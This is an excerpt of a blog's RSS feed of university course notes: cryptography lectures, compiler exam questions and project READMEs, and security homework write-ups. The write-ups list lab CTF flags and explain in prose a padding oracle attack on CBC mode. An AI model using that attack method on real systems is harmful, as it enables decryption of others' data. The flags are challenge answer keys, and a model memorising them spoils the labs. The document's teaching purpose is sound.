&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>Drawback&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>RC4在後來被指出他所產生的密鑰並不隨機，存在統計上的偏誤，並且密文有洩漏明文資訊的可能，
因此已不再被建議使用。
:::&lt;/p></description></item><item><title>Cryptography Lec 6(Key Agreement Protocol) - Notes</title><link>https://bernie6401.github.io/docs/security/course/ntu-crypto/cryptography-lec-6key-agreement-protocol---notes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-crypto/cryptography-lec-6key-agreement-protocol---notes/</guid><description>&lt;h1 id="cryptography-lec-6key-agreement-protocol---notes">
 Cryptography Lec 6(Key Agreement Protocol) - Notes
 &lt;a class="anchor" href="#cryptography-lec-6key-agreement-protocol---notes">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-cryptography-ntu">
 tags: &lt;code>Cryptography&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-cryptography-ntu">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/2LOnp3Tw-Uo">About HSM(Hardware Security Module) - 什麼是硬體安全模組？&lt;/a>&lt;/p>
&lt;hr>
&lt;p>&lt;a href="https://www.geeksforgeeks.org/what-is-wide-mouth-frog/">What is Wide-Mouth Frog?&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>The Wide Mouth Frog Protocol is a computer network verification protocol typically used on unsecured networks. It permits people communicating over a network to verify their identity to each other, it also helps in preventing replay attacks, or snooping and offers detection of any alteration and the prevention of any unwanted reading. This can be demonstrated by means of BAN (Burrows–Abadi–Needham) logic. However, to avoid active attacks, some form of message authentication or authenticated encryption must be used.&lt;/p></description></item><item><title>Machine Learning Hand-write Homework &amp; Answer</title><link>https://bernie6401.github.io/docs/security/course/ntu-ml/machine-learning-hand-write-homework--answer/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-ml/machine-learning-hand-write-homework--answer/</guid><description>&lt;h1 id="machine-learning-hand-write-homework--answer">
 Machine Learning Hand-write Homework &amp;amp; Answer
 &lt;a class="anchor" href="#machine-learning-hand-write-homework--answer">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntu_ml-machine-learning">
 tags: &lt;code>NTU_ML&lt;/code> &lt;code>Machine Learning&lt;/code>
 &lt;a class="anchor" href="#tags-ntu_ml-machine-learning">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>&lt;a href="https://hackmd.io/@lH2AB7kCSAS3NPw2FffsGg/Sk1n8xPWo">HW1&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://hackmd.io/@lH2AB7kCSAS3NPw2FffsGg/ByMEkRdVi">HW1-Ans&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://hackmd.io/@lH2AB7kCSAS3NPw2FffsGg/r1otQp7Gi">HW2&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://hackmd.io/@lH2AB7kCSAS3NPw2FffsGg/H1K9vmYVi">HW2-Ans&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://hackmd.io/@lH2AB7kCSAS3NPw2FffsGg/Hy3kRxTMs">HW3&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://hackmd.io/@lH2AB7kCSAS3NPw2FffsGg/BJod1Djro">HW3-Ans&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://hackmd.io/@lH2AB7kCSAS3NPw2FffsGg/H1ucYOpNo">HW4&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://hackmd.io/@lH2AB7kCSAS3NPw2FffsGg/H1P8BI2Dj">HW4-Ans&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>NTU CNS Final Project Proposal</title><link>https://bernie6401.github.io/docs/security/course/ntu-cns/ntu-cns-final-project-proposal/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cns/ntu-cns-final-project-proposal/</guid><description>&lt;h1 id="ntu-cns-final-project-proposal">
 NTU CNS Final Project Proposal
 &lt;a class="anchor" href="#ntu-cns-final-project-proposal">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntucns">
 tags: &lt;code>NTUCNS&lt;/code>
 &lt;a class="anchor" href="#tags-ntucns">#&lt;/a>
&lt;/h6>
&lt;h2 id="problem-description--research-question秉學">
 Problem description / Research question(秉學)
 &lt;a class="anchor" href="#problem-description--research-question%e7%a7%89%e5%ad%b8">#&lt;/a>
&lt;/h2>
&lt;h3 id="terminology">
 Terminology
 &lt;a class="anchor" href="#terminology">#&lt;/a>
&lt;/h3>
&lt;p>Federated Learning is a decentralized machine learning method that enables training models without exposing data. Traditional machine learning methods require all data to be centralized in one location for training, but Federated Learning enables models to be trained on many distributed devices, such as smartphones, tablets, or embedded devices, with each device training its own local data. This greatly reduces data transmission and storage requirements and better protects user privacy.&lt;/p></description></item><item><title>NTU Compiler Technology Previous Exam 2019 Spring</title><link>https://bernie6401.github.io/docs/security/course/ntu-ct/ntu-compiler-technology-previous-exam-2019-spring/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-ct/ntu-compiler-technology-previous-exam-2019-spring/</guid><description>&lt;h1 id="ntu-compiler-technology-previous-exam-2019-spring">
 NTU Compiler Technology Previous Exam 2019 Spring
 &lt;a class="anchor" href="#ntu-compiler-technology-previous-exam-2019-spring">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntu_ct-ntu-compiler-techonology-of-programming-language-final-exam">
 tags: &lt;code>NTU_CT&lt;/code> &lt;code>NTU&lt;/code> &lt;code>Compiler Techonology of Programming Language&lt;/code> &lt;code>Final Exam&lt;/code>
 &lt;a class="anchor" href="#tags-ntu_ct-ntu-compiler-techonology-of-programming-language-final-exam">#&lt;/a>
&lt;/h6>
&lt;ol>
&lt;li>
&lt;p>Please explain three different compiler optimization techniques :
(a) 1st compiler optimization technique: (5points/5)
(b) 2nd compiler optimization technique: (5points/10)
(c) 3rd compiler optimization techniques: (5points/15)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Many computer systems provide an interactive debugger (for example, &lt;code>gdb&lt;/code> or db x) to assist users in diagnosing and correcting runtime errors. Although a debugger is run long after a compiler has done its job, the two tools still must cooperate. What information (beyond the translation of a program) must a compiler supply to support effective runtime debugging? (5 points/20)&lt;/p></description></item><item><title>NTU Compiler Technology Previous Exam 2020 Spring</title><link>https://bernie6401.github.io/docs/security/course/ntu-ct/ntu-compiler-technology-previous-exam-2020-spring/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-ct/ntu-compiler-technology-previous-exam-2020-spring/</guid><description>&lt;h1 id="ntu-compiler-technology-previous-exam-2020-spring">
 NTU Compiler Technology Previous Exam 2020 Spring
 &lt;a class="anchor" href="#ntu-compiler-technology-previous-exam-2020-spring">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntu_ct-ntu-compiler-techonology-of-programming-language-final-exam">
 tags: &lt;code>NTU_CT&lt;/code> &lt;code>NTU&lt;/code> &lt;code>Compiler Techonology of Programming Language&lt;/code> &lt;code>Final Exam&lt;/code>
 &lt;a class="anchor" href="#tags-ntu_ct-ntu-compiler-techonology-of-programming-language-final-exam">#&lt;/a>
&lt;/h6>
&lt;ol>
&lt;li>
&lt;p>According to the grammar of AC in the right , please write down the recursive descent parsing procedure for nonterminal Expr. (10 points/10)
&lt;img src="https://imgur.com/fIUehwA.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Please write down a regular expression that defines the set of strings recognized by the FA in the following and explain your answer (5points/ 15)
&lt;img src="https://imgur.com/oWs2kC0.png" alt="" />&lt;/p></description></item><item><title>NTU Compiler Technology Project 1</title><link>https://bernie6401.github.io/docs/security/course/ntu-ct/ntu-compiler-technology-project-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-ct/ntu-compiler-technology-project-1/</guid><description>&lt;h1 id="ntu-compiler-technology-project-1">
 NTU Compiler Technology Project 1
 &lt;a class="anchor" href="#ntu-compiler-technology-project-1">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntu_ct-ntu-compiler-techonology-of-programming-language">
 tags: &lt;code>NTU_CT&lt;/code> &lt;code>NTU&lt;/code> &lt;code>Compiler Techonology of Programming Language&lt;/code>
 &lt;a class="anchor" href="#tags-ntu_ct-ntu-compiler-techonology-of-programming-language">#&lt;/a>
&lt;/h6>
&lt;h2 id="acdc-compiler">
 AcDc Compiler
 &lt;a class="anchor" href="#acdc-compiler">#&lt;/a>
&lt;/h2>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>This is a project from NTU (National Taiwan University) course, Compiler Technology of Programming Language.&lt;/li>
&lt;li>First project is aim to
&lt;ul>
&lt;li>add multiplier and division operation in this compiler&lt;/li>
&lt;li>let compiler can recognize multi character identifier(variable) name by alphabet string&lt;/li>
&lt;li>use constant folding to optimize the statement&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="how-to-use">
 How to use?
 &lt;a class="anchor" href="#how-to-use">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>You can browse Assignment1.pdf. You must run in Linux OS environment(more conveniently). When you finish the coding, use &lt;code>$ make&lt;/code> command directly.&lt;/li>
&lt;li>&lt;code>$ ./AcDc &amp;lt;input sample address&amp;gt; &amp;lt;output file address&amp;gt;&lt;/code>
&lt;ul>
&lt;li>For instance: &lt;code>$ ./AcDc ../test/sample1.ac ./output&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="something-need-to-know-first">
 Something need to know first
 &lt;a class="anchor" href="#something-need-to-know-first">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>It can not recognize the bottom line as identifier name.&lt;/li>
&lt;li>It can not print negative value like $1-2=-1$ expression. Actually speaking, it can calculate correctly but it can not print it out.(I&amp;rsquo;ll check it out later.)
&lt;ul>
&lt;li>You can check &lt;a href="https://bernie6401.github.io/test/constfold.ac">constfold testbench&lt;/a>&lt;/li>
&lt;li>Solution and Why: In Dc Language, the bottom line represent negative symbol. You can not just use minus as negative symbol, replace it by bottom line instead.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>It can not recognize identifier name with numbers. You can check &lt;a href="https://bernie6401.github.io/test/longname.ac">longname.ac&lt;/a>&lt;/li>
&lt;li>The other testbenchs can compile from Ac language to Dc language correctly.&lt;/li>
&lt;/ul>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://github.com/jaidTw/AcDc">AcDc&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/ZephyrZhuQi/AcDcCompiler">AcDcCompiler&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>NTU Compiler Technology Project 2</title><link>https://bernie6401.github.io/docs/security/course/ntu-ct/ntu-compiler-technology-project-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-ct/ntu-compiler-technology-project-2/</guid><description>&lt;h1 id="ntu-compiler-technology-project-2">
 NTU Compiler Technology Project 2
 &lt;a class="anchor" href="#ntu-compiler-technology-project-2">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntu_ct-ntu-compiler-techonology-of-programming-language-scanner">
 tags: &lt;code>NTU_CT&lt;/code> &lt;code>NTU&lt;/code> &lt;code>Compiler Techonology of Programming Language&lt;/code> &lt;code>Scanner&lt;/code>
 &lt;a class="anchor" href="#tags-ntu_ct-ntu-compiler-techonology-of-programming-language-scanner">#&lt;/a>
&lt;/h6>
&lt;p>:::spoiler
[TOC]
:::&lt;/p>
&lt;h2 id="objective">
 Objective
 &lt;a class="anchor" href="#objective">#&lt;/a>
&lt;/h2>
&lt;p>This is compiler project 2 that aim to construct the scanner by handmade with some sample code. The output is symbol table that the frequency of each identifier and the result is sorted.&lt;/p>
&lt;h2 id="run-and-test">
 Run and Test
 &lt;a class="anchor" href="#run-and-test">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ make /*use make in src folder*/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ./scanner ../test/sample1.ac
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="output-of-each-sample">
 Output of each sample
 &lt;a class="anchor" href="#output-of-each-sample">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>For sample1.ac&lt;/p></description></item><item><title>NTU Compiler Technology Project 3</title><link>https://bernie6401.github.io/docs/security/course/ntu-ct/ntu-compiler-technology-project-3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-ct/ntu-compiler-technology-project-3/</guid><description>&lt;h1 id="ntu-compiler-technology-project-3">
 NTU Compiler Technology Project 3
 &lt;a class="anchor" href="#ntu-compiler-technology-project-3">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntu_ct-ntu-compiler-techonology-of-programming-language-yacc-lex">
 tags: &lt;code>NTU_CT&lt;/code> &lt;code>NTU&lt;/code> &lt;code>Compiler Techonology of Programming Language&lt;/code> &lt;code>YACC&lt;/code> &lt;code>Lex&lt;/code>
 &lt;a class="anchor" href="#tags-ntu_ct-ntu-compiler-techonology-of-programming-language-yacc-lex">#&lt;/a>
&lt;/h6>
&lt;p>[TOC]&lt;/p>
&lt;h2 id="objective">
 Objective
 &lt;a class="anchor" href="#objective">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>The main task for this project is to revise &lt;code>src/parser.y&lt;/code> and generate &lt;code>parser&lt;/code> file properly to compile test code in &lt;code>test&lt;/code> folder.&lt;/li>
&lt;li>And then use &lt;code>Graphviz&lt;/code> command to visualize the structure of these test code&lt;/li>
&lt;/ul>
&lt;h2 id="how-to-run">
 How to run?
 &lt;a class="anchor" href="#how-to-run">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Just use &lt;code>make&lt;/code> to compile all files in &lt;code>/src&lt;/code>. Though you&amp;rsquo;ll get a lots of warning shown as below, you can ignore them and obtain the target file &lt;code>parser&lt;/code>.
&lt;pre tabindex="0">&lt;code class="language-bash=" data-lang="bash=">bison -v -d parser.y
parser.y: warning: 1 shift/reduce conflict [-Wconflicts-sr]
flex lexer.l
gcc -g -c alloc.c
gcc -g -c parser.tab.c
parser.tab.c: In function ‘yyparse’:
parser.tab.c:2565:7: warning: implicit declaration of function ‘yyerror’; did you mean ‘yyerrok’? [-Wimplicit-function-declaration]
 yyerror (YY_(&amp;#34;syntax error&amp;#34;));
 ^~~~~~~
 yyerrok
parser.y: At top level:
parser.y:825:3: warning: data definition has no type or storage class
 yydebug = 1;
 ^~~~~~~
parser.y:825:3: warning: type defaults to ‘int’ in declaration of ‘yydebug’ [-Wimplicit-int]
parser.y:827:1: warning: return type defaults to ‘int’ [-Wimplicit-int]
 main (argc, argv)
 ^~~~
parser.y: In function ‘main’:
parser.y:834:5: warning: implicit declaration of function ‘printGV’; did you mean ‘printf’? [-Wimplicit-function-declaration]
 printGV(prog, NULL);
 ^~~~~~~
 printf
gcc -g -c functions.c
gcc -g -o parser parser.tab.o alloc.o functions.o -lfl
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>Use parser to compile all files in &lt;code>/test&lt;/code> folder and you will get &lt;code>AST_Graph.gv&lt;/code> in &lt;strong>&lt;code>/test&lt;/code>&lt;/strong> folder.
&lt;strong>&lt;code>/src&lt;/code>&lt;/strong>
&lt;pre tabindex="0">&lt;code class="language-bash=" data-lang="bash=">./parser ../test/control.c
dot -Tpng -o ../test/control.png ../test/AST_Graph.gv
./parser ../test/decl.c
dot -Tpng -o ../test/decl.png ../test/AST_Graph.gv
./parser ../test/expr.c
dot -Tpng -o ../test/expr.png ../test/AST_Graph.gv
./parser ../test/func.c
dot -Tpng -o ../test/func.png ../test/AST_Graph.gv
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>Note that in &lt;code>parser.y&lt;/code>, I set &lt;code>yydebug = 1&lt;/code> so that we can see the debug message from parser
&lt;pre tabindex="0">&lt;code class="language-cpp=821" data-lang="cpp=821">#ifdef YYDEBUG
 yydebug = 1;
#endif
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="for-ta">
 For TA
 &lt;a class="anchor" href="#for-ta">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>I changed a little bit &lt;code>functions.c&lt;/code> that will generate &lt;code>AST_Graph.gv&lt;/code> at &lt;code>test/&lt;/code> folder.&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code class="language-cpp=150" data-lang="cpp=150">void printGV(AST_NODE *root, char* fileName)
{
 if (fileName == NULL) {
 fileName = &amp;#34;../test/AST_Graph.gv&amp;#34;;
 }
 ...
}
&lt;/code>&lt;/pre>&lt;h2 id="analysis">
 Analysis
 &lt;a class="anchor" href="#analysis">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>You can see the relationship between structure map and test code by yourself.&lt;/li>
&lt;li>&lt;strong>control.c&lt;/strong>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">int main()
{
 int i;
 int p;
 int k, j;
 for (i=0; i&amp;lt;9; i=i+1) {
 /* empty */
 }
 for (i=0, p=4+4; i&amp;lt;9; i=i+1, p=i) {
 write(&amp;#34;test&amp;#34;);
 }
 for (;;) {
 /*empty*/
 }
 while (1) {
 }
 while (2) {
 write(&amp;#34;haha&amp;#34;);
 write(&amp;#34;wow&amp;#34;);
 }
 if (k == j) {
 write(&amp;#34;first&amp;#34;);
 }
 if (k == j) {
 write(&amp;#34;first&amp;#34;);
 } else if (j == k) {
 write(&amp;#34;second&amp;#34;);
 } else {
 write(&amp;#34;third&amp;#34;);
 }
}
&lt;/code>&lt;/pre>&lt;img src="https://imgur.com/4zTAsML.png" alt="graphviz of control.c" />&lt;/li>
&lt;li>&lt;strong>decl.c&lt;/strong>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">typedef float GFLOAT;
int main() {
 typedef int INT, INT2, INT3;
 typedef float FLOAT;
 typedef void VOID;
 typedef void VOID2, VOID3;
 INT f[3][3*3-(4+2)/2];
 FLOAT f2;
}
&lt;/code>&lt;/pre>&lt;img src="https://imgur.com/6KWV4IT.png" alt="graphviz of decl.c" />&lt;/li>
&lt;li>&lt;strong>expr.c&lt;/strong>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">int fn1() {
 return 1;
}
float fn3() {
 return 1.0;
}
int fn4(int a, int b) {
 return 1;
}
int expr(int a, int b, int c, int d,
 float fa, float fb, float fc) {
 int i, j, k, l;
 float fi = 1.0, fj = 2.0, fk = 3.0, fl = 4.0;

 fi = 1.2*fi + -fj * (fl - fk * fn3());
 fi = -fn3() -(-(-(4)));
 fi = !fn3() -(!(!(4)));
 i = !fn1();
 i = 1 &amp;lt; 2;
 i = 1 &amp;gt; 2;
 i = 1 &amp;gt;= 2;
 i = 1 &amp;lt;= 2;
 i = 1 != 2;
 i = 1 == 2;
 i = fn4(1+3*4*fn4(2,3), 3);
 return 1;
}
int main() {
}
&lt;/code>&lt;/pre>&lt;img src="https://imgur.com/7a6OyJA.png" alt="graphviz of expr.c" />&lt;/li>
&lt;li>&lt;strong>func.c&lt;/strong>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">int fn1() {
 int ABC = 5;
 return ABC+5;
}
void fn2() {
}
void fn3(int a, int b[3][4]) {
}
int main() {
 int b[4][4];
 fn1();
 fn2();
 fn3(2, b);
}
&lt;/code>&lt;/pre>&lt;img src="https://imgur.com/BvW5b2U.png" alt="graphviz of func.c" />&lt;/li>
&lt;/ul>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://github.com/liuxt/Compiler/blob/master/hw3">Github example&lt;/a>
&lt;a href="https://bluelove1968.pixnet.net/blog/post/222285652?utm_source=PIXNET&amp;amp;utm_medium=Blog_CollectionEXP_login">Simple intro of yacc &amp;amp; lex&lt;/a>
&lt;a href="https://www.netadmin.com.tw/netadmin/zh-tw/technology/122966CB664D4A17ABAAD11FC2AA887C?page=3">Simple intro of Graphviz&lt;/a>
&lt;a href="https://arcb.csc.ncsu.edu/~mueller/codeopt/codeopt00/y_man.pdf">A GUIDE TO LEX &amp;amp; YACC from TA&lt;/a>
大推：&lt;a href="https://good-ed.blogspot.com/2010/04/lexyacc.html">以lex/yacc實作算式計算機&lt;/a>&lt;/p></description></item><item><title>NTU Compiler Technology Project 4</title><link>https://bernie6401.github.io/docs/security/course/ntu-ct/ntu-compiler-technology-project-4/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-ct/ntu-compiler-technology-project-4/</guid><description>&lt;h1 id="ntu-compiler-technology-project-4">
 NTU Compiler Technology Project 4
 &lt;a class="anchor" href="#ntu-compiler-technology-project-4">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntu_ct-ntu-compiler-techonology-of-programming-language-code-generation">
 tags: &lt;code>NTU_CT&lt;/code> &lt;code>NTU&lt;/code> &lt;code>Compiler Techonology of Programming Language&lt;/code> &lt;code>Code Generation&lt;/code>
 &lt;a class="anchor" href="#tags-ntu_ct-ntu-compiler-techonology-of-programming-language-code-generation">#&lt;/a>
&lt;/h6>
&lt;p>[TOC]&lt;/p>
&lt;h2 id="how-to-run">
 How to run?
 &lt;a class="anchor" href="#how-to-run">#&lt;/a>
&lt;/h2>
&lt;p>First, put your testing file and &lt;code>main.S&lt;/code> to the folder same as &lt;code>parser&lt;/code> file&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ make
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ./parser &lt;span style="color:#f92672">[&lt;/span>testing file&lt;span style="color:#f92672">]&lt;/span>.c
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ aarch64-linux-gnu-gcc -static -O0 main.S
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ qemu-aarch64-static ./a.out
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Or, you can put the &lt;code>run.sh&lt;/code> and &lt;code>main.S&lt;/code> in the same directory and run&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ ./run.sh &lt;span style="color:#f92672">[&lt;/span>your parser&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>the C file&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ qemu-aarch64-static ./a.out
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Note that you must change your test file&amp;rsquo;s &lt;code>main()&lt;/code> to &lt;font color="FF0000">&lt;code>MAIN()&lt;/code>&lt;/font>&lt;/p></description></item><item><title>NTU CS 2023 HW1 Write Up</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/ntu-cs-2023-hw1-write-up/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/ntu-cs-2023-hw1-write-up/</guid><description>&lt;h1 id="ntu-cs-2023-hw1-write-up">
 NTU CS 2023 HW1 Write Up
 &lt;a class="anchor" href="#ntu-cs-2023-hw1-write-up">#&lt;/a>
&lt;/h1>
&lt;p>Name: 何秉學 Student ID: R11921A16
:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="lab-cor">
 Lab-COR
 &lt;a class="anchor" href="#lab-cor">#&lt;/a>
&lt;/h2>
&lt;p>Flag: &lt;code>FLAG{Corre1ati0n_Attack!_!}&lt;/code>&lt;/p>
&lt;h3 id="解題流程與思路">
 解題流程與思路
 &lt;a class="anchor" href="#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af">#&lt;/a>
&lt;/h3>
&lt;p>這一題是簡單的padding oracle attack，他一樣是應用在CBC mode上，只是他padding的方式和上課教的有一點不一樣，他會先在最後放一個0x80然後接續放0x00直到長度%16==0，同樣的，我們可以用上課教的方式:&lt;/p>
&lt;ul>
&lt;li>What we have: 我們有的東西就是密文，所以可以利用它動一些手腳&lt;/li>
&lt;li>Our Goal 1: 目標是要取得原本和47進行XOR的數字是多少&lt;/li>
&lt;li>Our Goal 2: 這樣才可以取得最後的明文69
&lt;img src="https://hackmd.io/_uploads/r1p3yoGlp.png" alt="" />&lt;/li>
&lt;li>How to achieve: 我們可以簡單猜一個byte，從0x00開始，把密文換成猜測的byte，這樣256種組合和原本的Goal 1所求的byte進行XOR後會padding正確(也就是0x01)，此時假設我們已經猜到目前是0x2f符合padding正確的目標，代表現在的假明文是0x01，則原本和0x47進行XOR的數字就是0x01⊕0x2f，然後我們就可以回到原本解密的流程，也就是原本的密文0x47⊕剛剛得知的(0x01⊕0x2f)，就會得到想要的正確的明文0x69
&lt;img src="https://hackmd.io/_uploads/H1yKboMlp.png" alt="" />&lt;/li>
&lt;/ul>
&lt;p>所以套用到今天的lab意思也是一樣，如果要知道padding是否正確可以問oracle，反正只要符合明文+0x80+(0&amp;hellip;15)*0x00，這一題的flag長度可以從題目給的ciphertext看出來，顯然扣掉16bytes的initial vector後，flag的長度是32 bytes，也就是說我們從第二個block開始解，我們可以單獨把第一個ciphertext block當成第二個ciphertext block的initial vector，合併後再一起送出去，然後不斷變化IV的最後一個byte，如果oracle回傳&lt;code>Well received :)&lt;/code>代表第一個bytes猜對了，我們就可以把flag的最後一個bytes求出來$\to$我們猜的byte⊕原本ciphertext的最後一個byte⊕0x80(0x80是我們判斷padding正確的依據)，當然找到真正的plaintext byte後要把我們猜測的block恢復原狀，接著繼續找下一個byte&lt;/p>
&lt;h2 id="lab-lsb">
 Lab-LSB
 &lt;a class="anchor" href="#lab-lsb">#&lt;/a>
&lt;/h2>
&lt;p>Flag: &lt;code>FLAG{Viycx_qsklsjgmeld_fgd_spkgjo}&lt;/code>&lt;/p>
&lt;h3 id="解題流程與思路-1">
 解題流程與思路
 &lt;a class="anchor" href="#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af-1">#&lt;/a>
&lt;/h3>
&lt;p>這一題是變形過的Lease Significant Bit，上課教的例子是mod 2下的結果，而看source code可以知道目前他是mod 3下的結果，但換湯不換藥，只要把上課教的部分全部換成mod 3就可以了&lt;/p></description></item><item><title>NTU CS 2023 HW2 Write Up</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/ntu-cs-2023-hw2-write-up/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/ntu-cs-2023-hw2-write-up/</guid><description>&lt;h1 id="ntu-cs-2023-hw2-write-up">
 NTU CS 2023 HW2 Write Up
 &lt;a class="anchor" href="#ntu-cs-2023-hw2-write-up">#&lt;/a>
&lt;/h1>
&lt;p>Name: 何秉學 Student ID: R11921A16
:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="lab-hellorevworld">
 Lab-HelloRevWorld
 &lt;a class="anchor" href="#lab-hellorevworld">#&lt;/a>
&lt;/h2>
&lt;p>Flag: &lt;code>FLAG{h311O_revers1ng_3ngineer5}&lt;/code>&lt;/p>
&lt;h3 id="解題流程與思路">
 解題流程與思路
 &lt;a class="anchor" href="#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af">#&lt;/a>
&lt;/h3>
&lt;p>這一題主要是練習如何把如何把bytes變成字串:&lt;/p>
&lt;ol>
&lt;li>可以先把bytes的型別定義好(單獨的bytes變成array)，變成array有兩種方法，第一種是直接用&lt;code>Y&lt;/code>定義他的型別成&lt;code>int dword_2008[32]&lt;/code>，前面的int就看每一個字元是來決定，後面&lt;code>[32]&lt;/code>就代表有多少字元變成array；第二種方法就是直接按&lt;code>d&lt;/code>改變一個字元的型態變成int，然後在&lt;code>edit/Array&lt;/code>的地方可以叫出&lt;code>Convert to array&lt;/code>的視窗(如果前面沒有先用&lt;code>d&lt;/code>改變型態的話，他會以為所有字元都是一個byte，然後總共有128個字元這樣換算，但其實我們是總共32個字元，每一個字元是4個bytes，也就是int，這一點要特別注意)
&lt;img src="https://hackmd.io/_uploads/HJ3yvI-Ga.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/r1A_8LWMa.png" alt="" />&lt;/li>
